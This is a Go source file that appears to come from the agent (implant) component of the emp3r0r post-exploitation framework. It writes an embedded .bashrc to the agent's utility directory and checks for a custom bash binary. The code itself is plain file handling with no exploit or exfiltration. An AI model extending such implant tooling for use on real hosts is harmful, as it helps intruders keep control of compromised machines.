//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ExtractBashRC extract embedded bashrc and configure our bash shell
func ExtractBashRC() error {
	if !util.IsExist(RuntimeConfig.UtilsPath) {
		err := os.MkdirAll(RuntimeConfig.UtilsPath, 0o700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", RuntimeConfig.AgentRoot, err)
		}
	}
	bashrcData, err := file.ExtractFileFromString(file.BashRC)
	if err != nil {
		return fmt.Errorf("extract bashrc: %v", err)
	}
	err = os.WriteFile(RuntimeConfig.UtilsPath+"/.bashrc", bashrcData, 0o600)
	if err != nil {
		log.Printf("Write bashrc: %v", err)
	}

	// return ioutil.WriteFile(RuntimeConfig.UtilsPath+"/bash", bashData, 0755)
	customBash := RuntimeConfig.UtilsPath + "/bash"
	if !util.IsFileExist(customBash) {
		err = fmt.Errorf("custom bash binary (%s) not found, maybe you need to run `vaccine`",
			customBash)
		return err
	}

	return err
}
